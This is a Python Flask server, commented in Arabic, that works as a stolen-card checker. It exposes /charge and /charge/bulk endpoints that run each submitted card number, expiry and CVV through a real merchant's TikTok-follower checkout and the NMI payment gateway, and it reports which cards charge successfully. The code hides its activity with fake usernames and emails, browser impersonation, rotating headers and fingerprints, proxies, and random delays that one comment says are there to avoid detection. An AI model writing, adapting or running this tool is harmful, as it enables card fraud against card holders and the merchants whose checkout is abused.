from flask import Flask, request, jsonify
import time
import re
import random
import string
from curl_cffi import requests
from bs4 import BeautifulSoup
import json
import logging
from datetime import datetime
from user_agent import generate_user_agent
import hashlib
import uuid

app = Flask(__name__)

# إعدادات التسجيل
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# قائمة اليوزرات
usernames = [
    "aabk", "aadb", "aaah", "aabj", "aaab", "aacf", "aada", "aace", "aabi", "aac9",
    "aacd", "aabh", "aaan", "aaaa", "aac8", "aaao", "aacc", "aabg", "aac7", "aaaf",
    "aacb", "aabf", "aaau", "aac6", "aaca", "aabe", "aac5", "aab9", "aabd", "aac4",
    "aabc", "aab8", "aaak", "aaag", "aac3", "aaap", "aab7", "aabb", "aac2", "aab6",
    "aaba", "aac1", "aab5", "aaa9", "aac0", "aab4", "aaa8", "aaae", "aacz", "aab3",
    "aaa7", "aacy", "aaam", "aab2", "aacx", "aaa5", "aab1", "aacw", "aaa4", "aab0",
    "aacv", "aaa3", "aabz", "aacu", "aaa2", "aaat", "aaby", "aact", "aaa1", "aaaq",
    "aabx", "aacs", "aaa0", "aabw", "aacr", "aaaz", "aaad", "aabv", "aaas", "aaav",
    "aacq", "aaay", "aabu", "aaa6", "aadl", "aacp", "aaaj", "aaar", "aaac", "aabt",
    "aadk", "aaco", "aaax", "aabs", "aadj", "aacn", "aabr", "aaaw", "aadi", "aacm",
    "aabq", "aadh", "aacl", "aabp", "aadg", "aack", "aabo", "aadf", "aacj", "aabn",
    "aade", "aaci", "aabm", "aadd", "aach", "aaai", "aabl", "aadc", "aacg", "aaal",
    "aady", "aadn", "aadw", "aads", "aadr", "aadx", "aad0", "aadv", "aadu", "aadq",
    "aadm", "aadz", "aadp", "aadt", "aado", "aad2", "aad1", "aad5", "aaec", "aad7",
    "aad8", "aaeb", "aaef", "aad4", "aad9", "aaea", "aad6", "aaed", "aad3", "aaee",
    "aaem", "aaeq", "aaej", "aaeg", "aaep", "aaet", "aaeh", "aaes", "aaei", "aaeu",
    "aaeo", "aael", "aaer", "aaen", "aaek", "aaey", "aae2", "aae3", "aae0", "aae6",
    "aaez", "aae4", "aae7", "aaev", "aae9", "aaex", "aae8", "aae5", "aae1", "aaew",
    "aafe", "aafc", "aafm", "aafb", "aaff", "aafd", "aafj", "aafo", "aafl", "aafi",
    "aafh", "aafg", "aafn", "aafa", "aafk", "aaft", "aafy", "aaf3", "aafr", "aafw",
    "aafq", "aaf0", "aaf1", "aafz", "aafs", "aaf2", "aafu", "aafx", "aafv", "aafp",
    "aaf6", "aaf5", "aaga", "aaf4", "aaf7", "aage", "aagi", "aagg", "aagf", "aaf8",
    "aagb", "aaf9", "aagd", "aagc", "aagh", "aago", "aagj", "aagr", "aagt", "aagw",
    "aagq", "aagn", "aagk", "aagu", "aags", "aagm", "aagl", "aagp", "aagx", "aagv",
    "aagz", "aagy", "aag1", "aag2", "aag4", "aag0", "aag3", "aag7", "aahb", "aag8",
    "aahc", "aag9", "aag6", "aaha", "aag5", "aahh", "aahf", "aahi", "aahg", "aahj",
    "aahd", "aahl", "aahk", "aaho", "aahq", "aahr", "aahn", "aahm", "aahp", "aahe",
    "aahx", "aahs", "aahu", "aaht", "aahv", "aahw", "aah2", "aahy", "aah6", "aah3",
    "aah1", "aah5", "aahz", "aah4", "aah0", "aah7", "aaid", "aaic", "aah8", "aaib",
    "aah9", "aaie", "aaia", "aaij", "aaik", "aaih", "aaig", "aaim", "aaii", "aail",
    "aaif", "aaio", "aaip", "aais", "aair", "aaiq", "aait", "aain", "aaiw", "aaiu",
    "aaix", "aaiz", "aaiv", "aai1", "aaiy", "aai0", "aai6", "aai4", "aai8", "aai7",
    "aai5", "aai3", "aai2", "aajc", "aajd", "aajb", "aajg", "aai9", "aaje", "aajf",
    "aaja", "aaji", "aajn", "aajj", "aajh", "aajk", "aajl", "aajm", "aajp", "aajq",
    "aajs", "aajr", "aaju", "aajv", "aajt", "aajo", "aaj2", "aaj0", "aajw", "aajy",
    "aaj1", "aajx", "aajz", "aaj3", "aaj4", "aaj5", "aaj8", "aaka", "aaj9", "aaj7",
    "aaj6", "aakf", "aakh", "aakg", "aakc", "aakb", "aakd", "aake", "aakk", "aakj",
    "aaki", "aako", "aakp", "aakl", "aakn", "aakm", "aakr", "aaks", "aakv", "aakt",
    "aakz", "aakw", "aakx", "aaky", "aaku", "aakq", "aak1", "aak3", "aak0", "aak5",
    "aak4", "aak2", "aak6", "aak9", "aalc", "aale", "aala", "aak8", "aald", "aak7",
    "aalb", "aalf", "aalh", "aalj", "aalg", "aalk", "aali", "aall"
]

# قائمة إصدارات المتصفح للتبديل
BROWSER_VERSIONS = [
    "chrome110", "chrome120", "chrome124", "chrome99", "chrome101",
    "edge101", "edge110", "safari15_5", "safari16_5"
]

# قائمة اللغات
LANGUAGES = [
    "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,ar;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8"
]

def generate_gmail():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return f"{username}@gmail.com"

def get_random_username():
    return random.choice(usernames)

def parse_proxy(proxy_str):
    if not proxy_str:
        return None, None
    
    proxy_str = proxy_str.strip()
    
    if '@' in proxy_str and '://' in proxy_str:
        if 'http://' in proxy_str or 'https://' in proxy_str:
            return proxy_str, proxy_str
        else:
            return f"http://{proxy_str}", f"https://{proxy_str}"
    
    if proxy_str.startswith('socks5://'):
        return proxy_str, proxy_str
    
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str, proxy_str
    
    if ':' in proxy_str and not proxy_str.startswith('http'):
        return f"http://{proxy_str}", f"https://{proxy_str}"
    
    return None, None

def generate_fingerprint():
    """توليد بصمة متصفح فريدة"""
    return {
        "session_id": str(uuid.uuid4()),
        "fingerprint": hashlib.md5(f"{uuid.uuid4()}{random.random()}{time.time()}".encode()).hexdigest()[:16]
    }

def get_random_headers(user_agent):
    """توليد هيدرات عشوائية لمتصفح مختلف"""
    language = random.choice(LANGUAGES)
    sec_ch_ua = f'"Chromium";v="{random.randint(99, 124)}", "Not;A=Brand";v="99"'
    
    return {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': language,
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Ch-Ua': sec_ch_ua,
        'Sec-Ch-Ua-Mobile': random.choice(['?0', '?1']),
        'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Android"', '"iOS"']),
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

def process_card_sync(ccx, proxy_str=None):
    try:
        logger.info(f"Starting processing for card: {ccx[:10]}...")
        
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return {"status": "error", "message": "Invalid format"}
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # إعداد البروكسي
        proxies = None
        if proxy_str:
            http_proxy, https_proxy = parse_proxy(proxy_str)
            if http_proxy and https_proxy:
                proxies = {
                    "http": http_proxy,
                    "https": https_proxy,
                }
                logger.info(f"Using proxy: {http_proxy}")
            else:
                logger.warning(f"Invalid proxy format: {proxy_str}")
        
        # اختيار نسخة متصفح عشوائية
        impersonate_version = random.choice(BROWSER_VERSIONS)
        logger.info(f"Impersonating: {impersonate_version}")
        
        # إنشاء جلسة جديدة
        session = requests.Session(
            impersonate=impersonate_version,
            proxies=proxies,
            timeout=30,
        )
        
        # إنشاء بصمة جديدة
        fingerprint = generate_fingerprint()
        logger.info(f"Fingerprint: {fingerprint['fingerprint']}")
        
        user = generate_user_agent()
        headers = get_random_headers(user)
        
        # ====== الخطوة 1 ======
        logger.info("Getting initial page")
        time.sleep(random.uniform(1, 3))  # تأخير عشوائي
        
        response = session.get(
            'https://boostme.com/tiktok-followers/tiktok-account-information/100-followers',
            headers=headers
        )
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token = soup.find('input', {'name': 'socialboosting_platform_checkout_account_information[_token]'})['value']
        data = {
            'socialboosting_platform_checkout_account_information[handle]': get_random_username(),
            'socialboosting_platform_checkout_account_information[email]': generate_gmail(),
            'socialboosting_platform_checkout_account_information[packageId]': '',
            'socialboosting_platform_checkout_account_information[_token]': token,
        }
        
        time.sleep(random.uniform(0.5, 1.5))
        response = session.post(
            'https://boostme.com/tiktok-followers/tiktok-account-information/100-followers',
            data=data,
            headers=headers,
            allow_redirects=True
        )
        
        v2_match = re.search(r'/cart-summary/([a-f0-9-]+)', response.text)
        if not v2_match:
            return {"status": "error", "message": "Failed to get cart ID"}
        cart_id = v2_match.group(1)
        logger.info(f"Cart ID: {cart_id}")
        
        # ====== الخطوة 2 ======
        logger.info("Getting cart summary")
        time.sleep(random.uniform(0.5, 1.5))
        
        response = session.get(
            f'https://boostme.com/cart-summary/{cart_id}',
            headers=headers
        )
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'socialboosting_checkout_cart_type[_token]'})
        token = token_input['value'] if token_input else None
        
        data = {
            'socialboosting_checkout_cart_type[package]': 'e3e32f1d-77d6-40cd-9c6d-ba8b25d0f3c6',
            'discount-code': '',
            'boostingRequestId': cart_id,
            'socialboosting_checkout_cart_type[_token]': token,
        }
        
        response = session.post(
            f'https://boostme.com/cart-summary/{cart_id}',
            data=data,
            headers=headers,
        )
        
        checkout_match = re.search(r'/solid-gate-checkout/create-payment/([a-f0-9]+)', response.text)
        if not checkout_match:
            return {"status": "error", "message": "Failed to get transaction ID"}
        transaction_id = checkout_match.group(1)
        logger.info(f"Transaction ID: {transaction_id}")
        
        # ====== الخطوة 3 ======
        logger.info("Creating token")
        time.sleep(random.uniform(0.5, 1.5))
        
        data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'source': '16',
        }
        
        response = session.post(
            'https://secure.nmi.com/token/api/create',
            headers=headers,
            data=data
        )
        token_id = response.json()['token']
        logger.info(f"Token created: {token_id}")
        
        # ====== الخطوة 4 ======
        headers_json = {
            'authority': 'secure.nmi.com',
            'accept': '*/*',
            'accept-language': random.choice(LANGUAGES),
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://secure.nmi.com',
            'user-agent': user,
            'sec-ch-ua': headers.get('Sec-Ch-Ua', '"Chromium";v="124"'),
            'sec-ch-ua-mobile': headers.get('Sec-Ch-Ua-Mobile', '?0'),
            'sec-ch-ua-platform': headers.get('Sec-Ch-Ua-Platform', '"Windows"'),
        }
        
        logger.info("Sending card number")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'ccnumber', 'value': n}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        time.sleep(random.uniform(0.3, 0.8))
        logger.info("Sending expiry date")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'ccexp', 'value': f"{mm}{yy}"}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        time.sleep(random.uniform(0.3, 0.8))
        logger.info("Sending CVV")
        json_data = {
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
            'tokenId': token_id,
            'data': [{'elementId': 'cvv', 'cvvDisplay': True, 'value': cvc}],
        }
        session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
        
        time.sleep(random.uniform(0.3, 0.8))
        logger.info("Looking up token")
        json_data = {
            'tokenId': token_id,
            'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
            'cartCorrelationId': '',
        }
        session.post('https://secure.nmi.com/token/api/lookup', json=json_data)
        
        # ====== الخطوة 5 ======
        logger.info("Executing payment")
        time.sleep(random.uniform(0.5, 1.5))
        
        json_data = {'token': token_id}
        response = session.post(
            f'https://boostme.com/nmi-checkout/create-payment/{transaction_id}',
            json=json_data,
            headers={
                'authority': 'boostme.com',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://boostme.com',
                'x-nmi-form': 'true',
                'user-agent': user,
                'accept-language': random.choice(LANGUAGES),
            }
        )
        
        result = response.json()
        r = result.get('responsetext', '')
        logger.info(f"Response: {r}")
        
        # مسح الكوكيز بين الطلبات (لجلسة جديدة)
        session.cookies.clear()
        
        if 'Approved' in r:
            return {
                "status": "success",
                "message": "Charged - 4$ !",
                "details": r,
                "card": f"{n[:4]}****{n[-4:]}",
                "browser": impersonate_version,
                "fingerprint": fingerprint['fingerprint']
            }
        else:
            return {
                "status": "failed",
                "message": r,
                "card": f"{n[:4]}****{n[-4:]}",
                "browser": impersonate_version,
                "fingerprint": fingerprint['fingerprint']
            }
            
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return {"status": "error", "message": str(e)}

@app.route('/charge', methods=['POST'])
def charge_card():
    try:
        data = request.get_json()
        if not data or 'cc' not in data:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        ccx = data['cc']
        proxy = data.get('proxy', None)
        
        result = process_card_sync(ccx, proxy)
        return jsonify(result), 200
        
    except Exception as e:
        logger.error(f"Error in charge endpoint: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/charge/bulk', methods=['POST'])
def charge_bulk():
    try:
        data = request.get_json()
        if not data or 'cards' not in data or not isinstance(data['cards'], list):
            return jsonify({"error": "Missing 'cards' list parameter"}), 400
        
        cards = data['cards']
        proxy = data.get('proxy', None)
        
        results = []
        for ccx in cards:
            result = process_card_sync(ccx, proxy)
            results.append({
                "card": ccx[:10] + "...",
                "result": result
            })
            # تأخير بين الطلبات عشان ما يكتشفونك
            time.sleep(random.uniform(1, 3))
        
        return jsonify({
            "total": len(results),
            "results": results
        }), 200
        
    except Exception as e:
        logger.error(f"Error in bulk charge endpoint: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/config', methods=['GET'])
def get_config():
    """عرض إعدادات الخادم"""
    return jsonify({
        "browsers": BROWSER_VERSIONS,
        "languages": LANGUAGES,
        "usernames_count": len(usernames),
        "max_workers": 20
    })

if __name__ == '__main__':
    logger.info("Starting Flask API server on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
